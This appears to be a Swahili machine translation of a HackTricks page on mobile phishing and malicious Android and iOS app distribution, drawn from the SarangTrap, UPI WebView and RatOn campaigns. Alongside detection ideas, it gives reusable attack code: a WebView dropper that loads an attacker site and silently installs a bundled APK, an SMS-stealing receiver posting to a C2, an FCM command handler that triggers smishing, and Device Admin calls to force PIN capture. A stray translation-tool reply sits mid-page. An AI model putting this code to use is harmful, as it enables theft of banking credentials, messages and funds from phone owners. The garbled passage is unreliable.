# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ukurasa huu unafunika mbinu zinazotumiwa na wahalifu kusambaza **malicious Android APKs** na **iOS mobile-configuration profiles** kupitia phishing (SEO, social engineering, fake stores, dating apps, n.k.).
> Nyenzo imeanzishwa kutoka kwenye kampeni ya SarangTrap iliyofichuliwa na Zimperium zLabs (2025) na utafiti mwingine wa umma.

## Mtiririko wa Shambulio

1. **SEO/Phishing Infrastructure**
* Jisajili kanda nyingi za domain zinazofanana (apps za dating, huduma za kushirikisha faili, huduma za gari…).
– Tumia maneno muhimu ya lugha ya eneo na emojis katika elementi ya `<title>` ili kupata nafasi kwenye Google.
– Weka maelekezo ya usakinishaji ya *both* Android (`.apk`) na iOS kwenye ukurasa mmoja wa kutua.
2. **Kipindi cha Kwanza cha Upakuaji**
* Android: kiungo moja kwa moja kwa APK isiyo *unsigned* au “third-party store”.
* iOS: `itms-services://` au kiungo cha HTTPS cha kawaida kinaelekeza kwenye **mobileconfig** profile yenye uharibifu (tazama chini).
3. **Baada ya usakinishaji: Social Engineering**
* Wakati wa kwanza kuendesha, app inaomba **invitation / verification code** (udanganyifu wa ufikiaji wa kipekee).
* Msimbo hutumwa kwa **POST** kupitia HTTP hadi Command-and-Control (C2).
* C2 inarudisha `{"success":true}` ➜ malware inaendelea.
* Sandbox / AV dynamic analysis ambazo hazitumi msimbo halali haziona **hakuna tabia hatarishi** (evasion).
4. **Matumizi mabaya ya ruhusa za Runtime** (Android)
* Ruhusa hatarishi zinaombwa tu **baada ya jibu chanya kutoka C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Toleo za hivi karibuni **zinaondoa `<uses-permission>` kwa SMS kutoka `AndroidManifest.xml`** lakini zinaacha njia ya Java/Kotlin inayosoma SMS kupitia reflection ⇒ inapunguza alama ya static wakati bado inafanya kazi kwenye vifaa vinavyotoa ruhusa kwa njia ya `AppOps` abuse au malengo ya zamani.
5. **Facade UI & Background Collection**
* App inaonyesha muonekano usio hatari (SMS viewer, gallery picker) utekelezaji wa ndani.
* Wakati huo huo hutuma data nje (exfiltrates):
- IMEI / IMSI, namba ya simu
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG kutoka `/sdcard/DCIM` zinasimbwa na [Luban](https://github.com/Curzibn/Luban) ili kupunguza ukubwa
- Yenye chaguo la SMS content (`content://sms`)
Payloads zinazipiwa kwa batch (batch-zipped) na kutumwa kupitia `HTTP POST /upload.php`.
6. **Teknika ya Uwasilishaji ya iOS**
* Profile moja ya **mobile-configuration profile** inaweza kuomba `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` n.k. ili kujiandikisha kifaa kwa usimamizi unaofanana na “MDM”.
* Maelekezo ya social-engineering:
1. Fungua Settings ➜ *Profile downloaded*.
2. Bonyeza *Install* mara tatu (picha-skrini kwenye ukurasa wa phishing).
3. Amini profile isiyo signed ➜ mshambulizi anapata ruhusa za *Contacts* & *Photo* bila kupitia ukaguzi wa App Store.
7. **Tabaka la Mtandao**
* Plain HTTP, mara nyingi kwenye port 80 na HOST header kama `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (hakuna TLS → rahisi kugundua).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Wakati wa tathmini ya malware, otomatisha awamu ya invitation code kwa Frida/Objection ili kufikia tawi la uharibifu.
* **Manifest vs. Runtime Diff** – Linganisha `aapt dump permissions` na runtime `PackageManager#getRequestedPermissions()`; kutokuwepo kwa ruhusa hatarishi ni ishara ya hatari.
* **Network Canary** – Sanidi `iptables -p tcp --dport 80 -j NFQUEUE` kugundua POST bursts zisizo thabiti baada ya kuingiza msimbo.
* **mobileconfig Inspection** – Tumia `security cms -D -i profile.mobileconfig` kwenye macOS ili orodhesha `PayloadContent` na kugundua entitlements za ziada.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** ili kushika mfululizo wa ghafla wa domain zilizo na maneno muhimu.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` kutoka kwa Dalvik clients nje ya Google Play.
* **Invite-code Telemetry** – POST ya nambari za tarakimu 6–8 mara baada ya usakinishaji wa APK inaweza kuashiria staging.
* **MobileConfig Signing** – Zuia configuration profiles zisizosainiwa kupitia sera za MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Viashiria (Za Kawaida)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Mufumo huu umeonekana katika kampeni zinazotumia mandhari za faida za serikali ili kuiba vyeti vya UPI vya India na OTPs. Waendeshaji huunganisha majukwaa yenye sifa kwa ajili ya usambazaji na ustahimilivu.

### Mnyororo wa utoaji kupitia majukwaa yanayotegemewa
- Video ya kuvutia kwenye YouTube → maelezo yana kiunganisho kifupi
- Kiunganisho kifupi → tovuti ya phishing kwenye GitHub Pages inayoiga portal halali
- Repo hiyo ya GitHub inahifadhi APK yenye beji bandia “Google Play” inayounganisha moja kwa moja kwenye faili
- Kurasa za phishing zinazobadilika zinahifadhiwa kwenye Replit; chaneli ya amri za mbali inatumia Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- APK ya kwanza ni msakinishaji (dropper) anayesafirisha malware halisi katika `assets/app.apk` na kuhimiza mtumiaji kuzima Wi‑Fi/data ya simu ili kupunguza utambuzi wa cloud.
- Embedded payload inasakinishwa chini ya lebo isiyoonekana tishio (kwa mfano, “Secure Update”). Baada ya usakinishaji, msakinishaji na payload wote hubaki kama apps tofauti.

Vidokezo vya triage ya static (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Ugunduzi wa endpoints kwa njia ya shortlink
- Malware inachukua orodha ya plain-text, comma-separated ya live endpoints kutoka shortlink; simple string transforms hutengeneza final phishing page path.

Mfano (safishwa):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Msimbo wa mfano (pseudo-code):
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Hatua ya “Make payment of ₹1 / UPI‑Lite” inapakia fomu ya HTML ya mshambulizi kutoka kwa endpoint ya dinamiki ndani ya WebView na inakusanya viwanja nyeti (nambari ya simu, benki, UPI PIN) ambavyo vinatumwa kwa `POST` kwenda `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Kujieneza mwenyewe na kukamata SMS/OTP
- Ruhusa kali zinaombwa mara ya kwanza kuendeshwa:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Mawasiliano huwekwa katika mzunguko ili kutuma kwa wingi smishing SMS kutoka kwenye kifaa cha mwathiriwa.
- SMS zinazoingia zinakamatwa na broadcast receiver na zinapakiwa zikiwa na metadata (sender, body, SIM slot, per-device random ID) kwenye `/addsm.php`.

Mchoro wa receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) kama C2 inayostahimili
- Payload inasajiliwa kwa FCM; ujumbe za push zina sehemu `_type` inayotumika kama switch kuchochea vitendo (mfano: kusasisha kiolezo za maandishi za phishing, kuwasha/kuzima tabia).

Mfano wa payload ya FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler rasimu:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Mifumo ya uwindaji na IOCs
- APK ina secondary payload kwenye `assets/app.apk`
- WebView inapakia payment kutoka `gate.htm` na inatoa data kwa `/addup.php`
- SMS exfiltration kwa `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) inayorejesha CSV endpoints
- Apps zenye lebo ya generic “Update/Secure Update”
- Ujumbe za FCM `data` zenye `_type` discriminator katika apps zisizo za kuaminika

### Mapendekezo ya utambuzi na ulinzi
- Wezesha alama kwa apps zinazowaelekeza watumiaji kuzima network wakati wa ufungaji kisha side-load APK ya pili kutoka `assets/`.
- Toa onyo kwa tuple ya ruhusa: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
- Ufuatiliaji wa egress kwa `POST /addup.php|/addsm.php` kwenye hosts zisizo za corporate; zuia infrastructure inayojulikana.
- Sheria za Mobile EDR: app isiyo ya kuaminika inayosajiliwa kwa FCM na kuingia kwenye tawi kulingana na `_type` field.

---

## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

Kampeni ya RatOn banker/RAT (ThreatFabric) ni mfano halisi wa jinsi operesheni za kisasa za mobile phishing zinavyochanganya WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, na hata NFC-relay orchestration. Sehemu hii inatoa muhtasari wa mbinu zinazoweza kurudiwa.

### Stage-1: WebView → native install bridge (dropper)
Wavamizi wanaonyesha WebView inayorejea kwenye ukurasa wa mshambuliaji na kuingiza JavaScript interface inayofichua native installer. Kugusa kitufe cha HTML kunaita native code ambayo inasakinisha APK ya awamu ya pili iliyojumuishwa katika assets za dropper kisha kuiendesha moja kwa moja.

Mfano mdogo:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Tafadhali weka hapa HTML au yaliyomo ya ukurasa unayotaka nitoe tafsiri. Nitatafsiri maandishi ya Kiingereza muhimu kwa Kiswahili na nitaacha bilioni za code, tags, links, refs, paths na majina ya huduma zisibadilishwe kama ulivyosema.
```html
<button onclick="bridge.installApk()">Install</button>
```
Baada ya kusakinishwa, dropper huanzisha payload kupitia explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Wazo la kuwinda: maombi yasiyotegemewa yanayoita `addJavascriptInterface()` na kufichua installer-like methods kwa WebView; APK ikisafirisha embedded secondary payload chini ya `assets/` na kuita Package Installer Session API.

### Mfereji wa idhini: Accessibility + Device Admin + maombi ya runtime yanayofuata
Stage-2 hufungua WebView inayoweka ukurasa wa “Access”. Kitufe chake kinaita exported method ambayo inaelekeza mwenye madhara kwenye mipangilio ya Accessibility na kuomba kuwezesha rogue service. Mara inapopewa, malware hutumia Accessibility kubonyeza kiotomatiki kupitia dialog za ruhusa za runtime zinazofuata (contacts, overlay, manage system settings, n.k.) na kuomba Device Admin.

- Accessibility kwa programu husaidia kukubali maombi ya baadaye kwa kutafuta vitufe kama “Allow”/“OK” kwenye node-tree na kutekeleza bonyeza.
- Uhakiki/ombi la ruhusa ya overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Angalia pia:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operators wanaweza kutoa amri za kufanya:
- kuonyesha overlay ya skrini nzima kutoka kwa URL, au
- kupitisha inline HTML inayopakiwa ndani ya overlay ya WebView.

Matumizi yanayoweza: kulazimisha (kuingiza PIN), kufungua wallet ili kunasa PINs, ujumbe wa fidia. Weka amri ili kuhakikisha ruhusa ya overlay imetolewa kama haipo.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: mara kwa mara toa dump ya Accessibility node tree, serialize maandishi/roles/bounds yanayoonekana na uyatumie kwa C2 kama pseudo-screen (amri kama `txt_screen` mara moja na `screen_live` kuendelea).
- High-fidelity: omesha MediaProjection na anzisha screen-casting/recording kwa mahitaji (amri kama `display` / `record`).

### ATS playbook (bank app automation)
Kutolewa kazi ya JSON, fungua app ya banki, endesha UI kupitia Accessibility kwa mchanganyiko wa maswali ya maandishi na kugusa kwa kuratibu, na ingiza PIN ya malipo ya mhasiriwa wakati unapofikiwa kuomba.

Mfano wa kazi:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Mifano ya maandishi yaliyoonekana katika mtiririko mmoja wa lengo (CZ → EN):
- "Nová platba" → "Malipo mapya"
- "Zadat platbu" → "Ingiza malipo"
- "Nový příjemce" → "Mpokeaji mpya"
- "Domácí číslo účtu" → "Nambari ya akaunti ya ndani"
- "Další" → "Ifuatayo"
- "Odeslat" → "Tuma"
- "Ano, pokračovat" → "Ndiyo, endelea"
- "Zaplatit" → "Lipa"
- "Hotovo" → "Imekamilika"

Waendeshaji pia wanaweza kuangalia/kuongeza vizingiti vya uhamisho kupitia amri kama `check_limit` na `limit` ambazo zinaelekeza kwenye UI ya vizingiti kwa njia sawa.

### Crypto wallet seed extraction
Malengo kama MetaMask, Trust Wallet, Blockchain.com, Phantom. Mtiririko: fungua (PIN iliyopelewa au nywila iliyotolewa), nenda kwenye Security/Recovery, funua/onyesha seed phrase, keylog/exfiltrate it. Tekeleza locale-aware selectors (EN/RU/CZ/SK) ili kusawazisha urambazaji kati ya lugha.

### Device Admin coercion
Device Admin APIs zinatumika kuongeza fursa za kunasa PIN na kumkasirisha mhusika:

- Kufunga mara moja:
```java
dpm.lockNow();
```
- Sababisha uthibitisho uliopo uishe ili kulazimisha kubadilisha (Accessibility inakamata PIN/nenosiri mpya):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Lazimisha ufunguaji usiotumia biometria kwa kuzima vipengele vya biometria vya keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Kumbuka: Mifumo mingi ya DevicePolicyManager inahitaji Device Owner/Profile Owner kwenye Android za hivi karibuni; baadhi ya builds za OEM zinaweza kuwa na udhaifu. Daima thibitisha kwenye OS/OEM lengwa.

### NFC relay orchestration (NFSkate)
Stage-3 inaweza kusakinisha na kuanzisha module ya nje ya NFC-relay (mfano, NFSkate) na hata kumpa kiolezo cha HTML kumwongoza mwathiriwa wakati wa relay. Hii inawezesha contactless card-present cash-out pamoja na ATS mtandaoni.

Muktadha: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Mawazo ya kugundua & ulinzi (mtindo wa RatOn)
- Tafuta WebViews zenye `addJavascriptInterface()` zinazoonyesha njia za installer/permission; kurasa zinazoisha kwa “/access” zinazochochea prompts za Accessibility.
- Toa tahadhari kwa apps zinazozalisha mwendo wa juu wa vitendo/vibonye vya Accessibility muda mfupi baada ya huduma kupewa ruhusa; telemetry inayofanana na Accessibility node dumps ikitumwa kwa C2.
- Angalia mabadiliko ya sera za Device Admin katika apps zisizotumika: `lockNow`, kuisha kwa password, kugeuza vipengele vya keyguard.
- Taarifu kuhusu prompts za MediaProjection kutoka kwa apps zisizo za kampuni na kufuatiliwa na uplodi za fremu kwa vipindi.
- Gundua usakinishaji/kuanzishwa kwa app ya nje ya NFC-relay iliyoamshwa na app nyingine.
- Kwa benki: itekeleze uthibitisho wa nje-ya-bandwidth, kufunga kwa biometrics, na mipaka ya miamala isiyoweza kupitishwa na uendeshaji wa kiotomatiki kwenye kifaa.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
